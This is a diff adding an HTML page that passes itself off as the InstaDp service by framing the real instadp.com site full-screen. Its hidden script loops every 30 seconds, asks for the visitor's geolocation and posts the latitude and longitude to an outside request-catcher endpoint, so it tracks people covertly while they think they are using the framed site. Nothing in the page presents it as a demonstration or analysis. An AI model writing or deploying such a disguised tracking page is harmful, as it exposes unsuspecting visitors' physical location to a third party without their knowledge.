@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US">
+
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+ 
+  <!-- Stylesheets
+  ============================================= -->
+  <link href="https://fonts.googleapis.com/css?family=Lato:300,400,400i,700|Poppins:300,400,500,600,700|PT+Serif:400,400i&amp;display=swap" rel="stylesheet" type="text/css" />
+ 
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script src="https://code.jquery.com/ui/1.13.1/jquery-ui.js"></script>
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- Document Title
+  ============================================= -->
+  <title>InstaDp</title>
+
+
+<style type="text/css">
+        html {
+            overflow: auto;
+        }
+          
+        html,
+        body,
+        div,
+        iframe {
+            margin: 0px;
+            padding: 0px;
+            height: 100%;
+            border: none;
+        }
+          
+        iframe {
+            display: block;
+            width: 100%;
+            border: none;
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+    </style>
+
+
+</head>
+
+<body>
+
+<!-- <p>Click the button to get your coordinates.</p>
+ -->
+
+<!-- <p id="demo"></p>
+<p id="demo2"></p>
+ -->
+
+
+ 
+
+
+ <iframe src="https://www.instadp.com/"
+            frameborder="0" 
+            marginheight="0" 
+            marginwidth="0" 
+            width="100%" 
+            height="100%" 
+            scrolling="auto">
+  </iframe>
+
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    // x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+ function showPosition(position) {
+ // x.innerHTML = "Latitude: " + position.coords.latitude + 
+//  "<br>Longitude: " + position.coords.longitude;
+
+
+      var settings = {
+        "url": "https://vinay.requestcatcher.com/data?lat="+position.coords.latitude+"&lng"+position.coords.longitude,
+        "method": "POST",
+        "headers": {
+          
+          "Content-Type": "application/json",
+          
+        },
+        
+      };
+
+
+      $.ajax(settings).done(function (response) {
+      }
+      );
+
+
+
+
+
+        // document.write( "Latitude: " + position.coords.latitude + " Longitude: " + position.coords.longitude + "<br>");
+
+
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+
+
+
+
+
+
+   async function Tutor() {
+      while (1<2) {        
+        await sleep(30000);
+         getLocation();
+      }
+   }
+   Tutor()
+
+
+
+
+</script>
+
+</body>
+</html>
+
